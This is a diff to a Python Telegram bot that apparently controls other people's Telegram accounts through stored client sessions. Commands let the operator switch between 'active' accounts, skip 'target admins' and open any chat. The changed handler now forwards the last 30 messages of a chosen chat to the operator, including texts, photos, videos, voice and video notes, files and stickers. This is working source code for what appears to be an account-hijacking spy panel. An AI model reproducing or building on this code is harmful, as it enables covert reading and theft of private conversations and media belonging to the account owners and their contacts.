@@ -376,7 +376,6 @@ async def cmd_active(message):
     except:
         await message.answer(f"✅ Активный ID: {uid}")
 
-# ===== ИСПРАВЛЕННЫЙ /swap =====
 @dp.message_handler(commands=['swap'])
 async def cmd_swap(message):
     global current_active_user
@@ -390,7 +389,6 @@ async def cmd_swap(message):
         num = int(args) - 1
         cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
         rows = cursor.fetchall()
-        # Исключаем админов
         na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
         if num < 0 or num >= len(na):
             await message.answer("❌ Неверный номер. Используй /users для просмотра")
@@ -469,7 +467,6 @@ async def cmd_chats(message):
         await message.answer(out, parse_mode='HTML')
     await message.answer("💡 /chat ID или @username - посмотреть чат")
 
-# ===== ИСПРАВЛЕННЫЙ /chat - РАБОТАЕТ ПО ID И @username =====
 @dp.message_handler(commands=['chat'])
 async def cmd_chat(message):
     if not is_admin(message.from_user.id):
@@ -484,7 +481,6 @@ async def cmd_chat(message):
         await message.answer("❌ Нет активного аккаунта")
         return
     
-    # Пробуем найти пользователя по ID или @username
     try:
         if args.isdigit():
             ent = await cl.get_entity(int(args))
@@ -507,7 +503,7 @@ async def cmd_chat(message):
     
     await message.answer(f"📱 <b>Чат с {target_name}</b>\n\nВыбери действие:", parse_mode='HTML', reply_markup=kb)
 
-# ===== ИСПРАВЛЕННЫЙ ПОКАЗ ПОСЛЕДНИХ 30 =====
+# ===== ПОСЛЕДНИЕ 30 С ПЕРЕСЫЛКОЙ МЕДИА =====
 @dp.callback_query_handler(lambda c: c.data.startswith('last_'))
 async def show_last(cb):
     if not is_admin(cb.from_user.id):
@@ -525,34 +521,55 @@ async def show_last(cb):
     
     await cb.answer("Загружаю последние 30 сообщений...")
     
-    msgs = []
+    msg_list = []
     async for msg in cl.iter_messages(target_id, limit=30):
-        if msg.text:
-            try:
-                if msg.out:
-                    sn = "👉 Я"
-                else:
-                    s = await cl.get_entity(msg.sender_id)
-                    if is_target_admin(s.id):
-                        continue
-                    sn = s.first_name or s.username or str(s.id)
-                dt = msg.date.strftime('%d.%m %H:%M')
-                msgs.append(f"[{dt}] {sn}: {msg.text[:200]}")
-            except:
-                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:200]}")
+        msg_list.append(msg)
     
-    if msgs:
-        response = f"💬 <b>ЧАТ С {target_name}</b>\n\n" + "\n".join(reversed(msgs))
-        if len(response) > 4000:
-            for i in range(0, len(msgs), 15):
-                part = "\n".join(reversed(msgs[i:i+15]))
-                await cb.message.answer(f"💬 <b>ЧАТ С {target_name}</b>\n\n{part}", parse_mode='HTML')
-        else:
-            await cb.message.answer(response, parse_mode='HTML')
-    else:
-        await cb.message.answer("📭 Нет сообщений или только медиа")
+    # Отправляем в обратном порядке (от старых к новым)
+    for msg in reversed(msg_list):
+        try:
+            if msg.text:
+                # Текстовое сообщение
+                if msg.out:
+                    sn = f"👤 Вы → {target_name}"
+                else:
+                    sn = f"👤 {target_name} → Вам"
+                dt = msg.date.strftime('%d.%m %H:%M:%S')
+                await cb.message.answer(f"**{sn}**\n🕒 {dt}\n📝 {msg.text[:500]}", parse_mode='Markdown')
+            elif msg.photo:
+                # Фото
+                await cb.message.answer_photo(msg.photo, caption=f"📷 Фото от {target_name}\n🕒 {msg.date.strftime('%d.%m %H:%M:%S')}")
+            elif msg.video:
+                # Видео
+                await cb.message.answer_video(msg.video, caption=f"📹 Видео от {target_name}\n🕒 {msg.date.strftime('%d.%m %H:%M:%S')}")
+            elif msg.video_note:
+                # Кружок (видеосообщение)
+                await cb.message.answer_video_note(msg.video_note)
+                await cb.message.answer(f"🔄 Кружок от {target_name}\n🕒 {msg.date.strftime('%d.%m %H:%M:%S')}")
+            elif msg.voice:
+                # Голосовое
+                await cb.message.answer_voice(msg.voice, caption=f"🎤 Голосовое от {target_name}\n🕒 {msg.date.strftime('%d.%m %H:%M:%S')}")
+            elif msg.document:
+                # Файл
+                await cb.message.answer_document(msg.document, caption=f"📎 Файл от {target_name}\n🕒 {msg.date.strftime('%d.%m %H:%M:%S')}")
+            elif msg.sticker:
+                # Стикер
+                await cb.message.answer_sticker(msg.sticker)
+                await cb.message.answer(f"🎨 Стикер от {target_name}\n🕒 {msg.date.strftime('%d.%m %H:%M:%S')}")
+            elif msg.gif:
+                # GIF
+                await cb.message.answer_document(msg.document, caption=f"🎬 GIF от {target_name}\n🕒 {msg.date.strftime('%d.%m %H:%M:%S')}")
+            else:
+                await cb.message.answer(f"📦 Сообщение от {target_name} (тип не распознан)\n🕒 {msg.date.strftime('%d.%m %H:%M:%S')}")
+            
+            await asyncio.sleep(0.2)
+        except Exception as e:
+            logger.error(f"Ошибка отправки: {e}")
+            await cb.message.answer(f"❌ Ошибка при загрузке сообщения от {msg.date.strftime('%d.%m %H:%M:%S')}")
+    
+    await cb.message.answer(f"✅ Показаны последние {len(msg_list)} сообщений из чата с {target_name}")
 
-# ===== ИСПРАВЛЕННЫЙ ЭКСПОРТ HTML =====
+# ===== ЭКСПОРТ HTML =====
 @dp.callback_query_handler(lambda c: c.data.startswith('html_'))
 async def export_html(cb):
     if not is_admin(cb.from_user.id):
